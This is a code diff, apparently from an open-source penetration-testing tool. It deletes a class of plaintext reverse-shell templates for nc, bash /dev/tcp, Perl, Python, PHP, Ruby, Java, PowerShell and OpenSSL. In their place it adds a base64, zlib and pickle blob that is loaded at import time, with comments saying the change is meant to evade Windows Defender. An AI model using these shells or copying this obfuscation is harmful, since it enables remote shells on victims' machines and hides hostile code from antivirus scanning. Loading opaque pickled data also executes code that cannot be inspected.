@@ -1,3 +1,6 @@
+import base64
+import pickle
+import zlib
 import select
 import socket
 import threading
@@ -328,44 +331,36 @@ def handle_listener_connection():
 
 
 class REVERSE_PAYLOAD:
-    NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
-    NC2 = """nc -e /bin/sh {0} {1}"""
-    NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
-    BASH0 = """sh -i >& /dev/tcp/{0}/{1} 0>&1"""
-    BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
-    BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
-    TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
-    PERL = (
-        """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
-        """if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");"""
-        """open(STDERR,">&S");exec("/bin/sh -i");}};'"""
+    # Evading Windows Defender
+    # Pocsuite3 is an open source security tool, not virus.
+    # I believe that this is a false positive of your antivirus tool :)
+    payload = (
+        b'eJx9Vd9v4kYQTntpT7r3vlYji4O1agwBcQ9xQCIcadJSQJjr9YQQMvYSfAF7612a'
+        b'IEBq3/3oPvbP6kv/if4LnfUPQkhUkOzd8cw33zeeWf9++mfj9Un820Uk/LLbisJ2'
+        b'sISSWLLSzFjezdyZn+1sS6TLbWnqeiU+h6ILlUb+bOvZsCnvYHO2g0biEoWvuq1K'
+        b'FH6Dj4oUsoDUK35ajcIzzFWcJagM03m+k26AQT4PB7jlxB6FX102zetyFH6b5G/k'
+        b'oeTQ30rCZiX0LcW+yCkKT6VjFJKpJT1tKPx/QCGFRtLvjkLyt8LIW0tmvBC5fyYB'
+        b'vh62O932EBGeCIPnygRdeFQ8V3fabw86Ufg3o8FCFq6w4hRM376jwsi5dQUDFCPH'
+        b'6hhk8NhMTK1/NbnBtJrZa/04MYeDdvMn7ZYKFvjCn649a0mJgqQVVTXcGbF9z6O2'
+        b'jJMAluMEE9cjOaa5yGhiCR83roq/zcZn1CPm8P1NV1MaeVNRjczS+zA8NrUHg8xE'
+        b'H6hNlMcuQdNuZ8gC9T8Nr3vdKPyHrcXc9+Iiu0vmBwISORpfTZG4TTnXfG7wemLW'
+        b'U7HprpkqTrcHwlWD65lCEpdLw1qhcp/rzopVCNdn7oJ6PlG1smrAC+azl80V1WD1'
+        b'R3a6bS0WZJSpVDQFdY5VqfJV/7ofhe/ZnEExgEJOsqzP5DWu1SOrZ4WCi3wVO7Qq'
+        b'x6qqxGCngw+Xn6LQDlbTNcIlirE1CrP6sNVPWkM/wtWFP3FjcOAscD0xO0ry1sEs'
+        b'eKnIq6LN5F+VyX5o/tyMwr8CqMNg5Ql3SXXspHRJ1DcMHwR6TDuVLmdFirfxEmes'
+        b'XTSOxyQ+Oy7yNdjC/RzrCQG1HFhgwxng+JCTK8mlhqxq0uRRZQwWB1Mg+9vRGBPr'
+        b'95YrrvyAqFH4pt/72B6Y1+1OJ/rl3y9OTnL2wqWeQHJdel/sTT/j6wdzzQVd6l3Z'
+        b'IHGZuI4Va8WepIDUCslLyHGBfJYYnMLo31NhxjaiGqPpWtDReJyTd45OZV1/V6tV'
+        b'a9u3G8TYGbEigjMjARIofYD6SBKhQVmDZKl3qHcr5qoKRdRbxgEzco4lLAwkB7yL'
+        b'wzWjXZzaTMGQPmDLm62bm7Zn+w5WRE0p4jJLI7O4Ugz1nKll30lQlz5AkkEe01j9'
+        b'3koUkzA4cK3EzLO476DQN6GAd8LuHVXvW2IujQ0opCGYT6KPhORFU0rj8/OYYkzt'
+        b'UlIijwn2RdY/Bq6gZI+DtPfrrDx736vFis+JijXOXkxr4XMqO+B1r9/umiYelX/I'
+        b'ozZIz1r+5JvFt9uDk5cDMw6HIDXGHzA5P5wvgE/SRir+unLlmKVHiTyoz7FZGmmW'
+        b'Jzmjlf4ftlBYwg=='
     )
-    PYTHON = (
-        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
-        """s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"""
-        """p=subprocess.call(["/bin/sh","-i"]);'"""
-    )
-    PHP = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
-    RUBY = """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
-    JAVA = (
-        'r = Runtime.getRuntime()\n'
-        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | '
-        'while read line; do $line 2>&5 >&5; done"] as String[])\n'
-        'p.waitFor()'
-    )
-    POWERSHELL = (
-        '''$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();'''
-        '''[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'''
-        '''{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'''
-        '''$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';'''
-        '''$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'''
-        '''$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
-    )
-    OPENSSL = (
-        'rm -rf /tmp/s;mkfifo /tmp/s||mknod /tmp/s p;'
-        '/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
-        'rm -rf /tmp/s'
-    )
+
+    vars().update(pickle.loads(zlib.decompress(base64.b64decode(payload))))
+    del payload
 
 
 if __name__ == "__main__":
